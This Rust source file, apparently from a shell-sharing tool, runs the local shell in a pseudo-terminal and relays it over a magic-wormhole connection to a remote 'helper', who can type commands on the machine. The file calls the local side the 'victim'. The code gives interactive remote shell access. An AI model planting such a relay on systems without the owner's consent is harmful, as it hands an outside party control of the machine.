// src/victim.rs
use crate::protocol::{Msg, decode, encode};
use anyhow::{Context, Result};
use magic_wormhole::{
    Wormhole,
    transit::{Abilities, RelayHint},
};
use portable_pty::{CommandBuilder, MasterPty, PtySize, native_pty_system};
use std::io::{Read, Write};
use tokio::sync::mpsc;

pub async fn run(
    mut wormhole: Wormhole,
    _relay_hints: Vec<RelayHint>,
    _abilities: Abilities,
) -> Result<()> {
    // ── 2. Create the PTY ─────────────────────────────────────────
    // Start with a sane default; a Resize message arrives momentarily.
    let pty_system = native_pty_system();
    let pair = pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    })?;

    // ── 3. Spawn the best available shell ─────────────────────────
    let shell = find_shell();
    let mut cmd = CommandBuilder::new(&shell);
    cmd.env("TERM", "xterm-256color");
    let mut child = pair
        .slave
        .spawn_command(cmd)
        .with_context(|| format!("failed to spawn {shell}"))?;
    drop(pair.slave); // slave side belongs to the child now

    let master: Box<dyn MasterPty + Send> = pair.master;
    let mut pty_reader = master.try_clone_reader()?;
    let pty_writer = master.take_writer()?;

    // ── 4. Optional: mirror to the victim's physical console ──────
    // let mut console = if mirror {
    //     std::fs::OpenOptions::new()
    //         .write(true)
    //         .open("/dev/tty")
    //         .ok()
    //         .map(|f| {
    //             if let Some((c, r)) = console_size() {
    //                 let _ = wormhole_send_console_size(c, r); // see below
    //             }
    //             f
    //         })
    // } else {
    //     None
    // };

    // ── 5. Bridge: PTY (blocking IO) <-> wormhole (async) ─────────
    //
    // portable-pty readers/writers are blocking, so we pump them on
    // dedicated threads connected to the async world via channels.
    let (pty_out_tx, mut pty_out_rx) = mpsc::channel::<Vec<u8>>(64);
    std::thread::spawn(move || {
        let mut buf = [0u8; 8192];
        loop {
            match pty_reader.read(&mut buf) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if pty_out_tx.blocking_send(buf[..n].to_vec()).is_err() {
                        break;
                    }
                }
            }
        }
    });

    let (to_pty_tx, mut to_pty_rx) = mpsc::channel::<Vec<u8>>(64);
    let mut pty_writer = pty_writer;
    std::thread::spawn(move || {
        while let Some(bytes) = to_pty_rx.blocking_recv() {
            if pty_writer.write_all(&bytes).is_err() {
                break;
            }
        }
    });

    let mut child_exit = tokio::task::spawn_blocking(move || child.wait());

    // ── 6. Main async loop ────────────────────────────────────────
    let result = loop {
        tokio::select! {
            // Shell output -> helper (+ optional local mirror)
            Some(bytes) = pty_out_rx.recv() => {
                // if let Some(c) = &mut console { let _ = c.write_all(&bytes); }
                wormhole.send(encode(&Msg::Data(bytes))?).await?;
            }

            // Messages from the helper
            incoming = wormhole.receive() => {
                match incoming {
                    Ok(raw) => match decode(&raw)? {
                        Msg::Data(bytes) => {
                            to_pty_tx.send(bytes).await?;
                        }
                        Msg::Resize { cols, rows } => {
                            master.resize(PtySize {
                                rows, cols, pixel_width: 0, pixel_height: 0,
                            })?;
                            // kernel delivers SIGWINCH to the shell itself
                        }
                        Msg::Bye => break Ok(()),
                    },
                    Err(e) => break Err(e.into()),
                }
            }

            // Shell exited -> we're done
            status = &mut child_exit => {
                match status {
                    Ok(Ok(_))     => {}                          // shell exited cleanly
                    Ok(Err(e))    => eprintln!("wait failed: {e}"),   // wait() itself errored
                    Err(join_err) => eprintln!("wait task: {join_err}"), // panicked
                }
                break Ok(());
            }
        }
    };

    let _ = wormhole.send(encode(&Msg::Bye)?).await;
    result
}

fn find_shell() -> String {
    if let Ok(s) = std::env::var("SHELL") {
        if std::path::Path::new(&s).exists() {
            return s;
        }
    }
    for c in ["/bin/bash", "/bin/sh", "/bin/ash", "/bin/dash"] {
        if std::path::Path::new(c).exists() {
            return c.into();
        }
    }
    "sh".into() // PATH resolution as last resort
}

/// TIOCGWINSZ on /dev/tty — for size negotiation when mirroring.
fn console_size() -> Option<(u16, u16)> {
    use std::os::unix::io::AsRawFd;
    let f = std::fs::File::open("/dev/tty").ok()?;
    let mut ws: libc::winsize = unsafe { std::mem::zeroed() };
    let rc = unsafe { libc::ioctl(f.as_raw_fd(), libc::TIOCGWINSZ, &mut ws) };
    (rc == 0 && ws.ws_col > 0).then_some((ws.ws_col, ws.ws_row))
}

fn wormhole_send_console_size(_c: u16, _r: u16) -> Result<()> {
    // Design note: send Msg::ConsoleSize right after handshake in run().
    // Left as a stub here to keep the handshake flow readable — move the
    // `wormhole` send into run() before the main loop.
    todo!()
}
